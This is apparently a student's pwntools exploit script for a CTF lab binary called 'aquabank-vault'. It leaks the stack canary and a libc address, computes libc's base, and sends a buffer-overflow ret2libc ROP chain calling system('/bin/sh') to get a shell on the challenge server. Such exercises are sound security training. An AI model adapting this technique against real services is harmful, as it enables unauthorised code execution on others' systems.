from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13513

context.binary = elf = ELF('/home/kali/Desktop/offsec/ctf/lab3_4_recap/aquabank-vault', checksec=False)
context.arch = 'amd64'

#libc_local = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
libc_remote = ELF('/home/kali/Desktop/offsec/ctf/lab3_4_recap/libc.so.6', checksec=False)
libc_local = libc_remote
#the remote server is using a different version of libc than my kali linux machine

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r


# python3 -c "from pwn import *; print(cyclic(200).decode())"
# p/x $rax
# python3 -c "from pwn import *; print(cyclic_find(0x6261616b6261616a))"

OFFSET_TO_CANARY = 136  #found with gdb with cyclic pattern + info registers rax
OFFSET_TO_RIP = OFFSET_TO_CANARY + 16

READ_PLT = elf.plt['read'] 

rop = ROP(elf)      # no PIE so it's fixed like plt and got addr
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Found 'ret' gadget at: {hex(ret_gadget)}")

#no pop_rdi, rsi, rdx, rax, syscall gadgets in elf

#bin_sh_string_addr = next(elf.search(b'/bin/sh'))    #address of "bin/sh"" -> NOT IN THE FILE, get it from libc

# FIND leak

l = process(elf.path)

libc_base_local = l.libs()[libc_local.path]  #libc base addres

print(hex(libc_base_local))

l.recvuntil(b'> ')
l.sendline(b'1')
l.recvuntil(b'chars):\n')
l.send(b'x'*8)
l.recvline()
leak_local = l.recvn(256)

#for i in range(0, len(leak), 8):
#    candidate = u64(leak[i:i+8])
#    print(f"[{i}:{i+8}] -> {hex(candidate)}")

leak_local_libc = u64(leak_local[152:160])
leak_offset = leak_local_libc - libc_base_local

leak_local_offset = leak_local_libc - libc_base_local
print(f"Leak offset in LOCAL libc: {hex(leak_local_offset)}")

r=conn()

#IF LOCAL, i can use r.libs(), if remote i can't. 
#libc_base = r.libs()[libc.path]  #libc base addres

#libc.address = libc_base

# FIND CANARY
r.recvuntil(b'> ')
r.sendline(b'1')
r.recvuntil(b'chars):\n')
r.send(b'x'*8)
r.recvline()
leak_remote = r.recvn(256)

#for i in range(0, len(leak_remote), 8):
#    candidate = u64(leak_remote[i:i+8])
#    print(f"[{i}:{i+8}] -> {hex(candidate)}")

canary = u64(leak_remote[72:80])
log.success(f'Canary: {hex(canary)}')

leak_remote_libc = u64(leak_remote[152:160])

libc_base_remote = leak_remote_libc - leak_offset
libc_remote.address = libc_base_remote

print(f" libc base address (remote): {hex(libc_base_remote)}")

system_addr = libc_remote.sym.system

rop_libc = ROP(libc_remote)
pop_rdi_ret_addr = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
log.info(f"Found helper gadget 'pop_rdi_ret' function at: {hex(pop_rdi_ret_addr)}")

binsh = next(libc_remote.search(b"/bin/sh\x00"))

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * 8,
    p64(ret_gadget),          
    p64(pop_rdi_ret_addr),
    p64(binsh),
    p64(system_addr),
)

r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"combination:\n", payload)
r.interactive()